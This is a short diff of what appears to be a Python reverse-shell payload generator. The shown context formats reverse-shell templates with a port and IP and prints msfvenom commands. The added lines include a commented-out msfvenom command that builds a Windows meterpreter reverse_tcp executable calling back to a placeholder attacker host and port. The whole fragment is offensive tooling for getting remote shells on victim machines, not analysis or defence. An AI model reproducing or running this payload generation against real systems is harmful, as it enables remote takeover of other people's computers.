@@ -37,3 +37,7 @@ for rev_shell in rev_shell_port_ip:
     payload = rev_shell.format(port, ip)
     shell_gen = msfvenom_command_gen(payload)
     print(shell_gen)
+
+# type3
+# print()
+#msfvenom p windows/meterpreter/reverse_tcp LHOST={DNS / IP / VPS IP} LPORT={PORT / Forwarded PORT} -f exe > example.exe
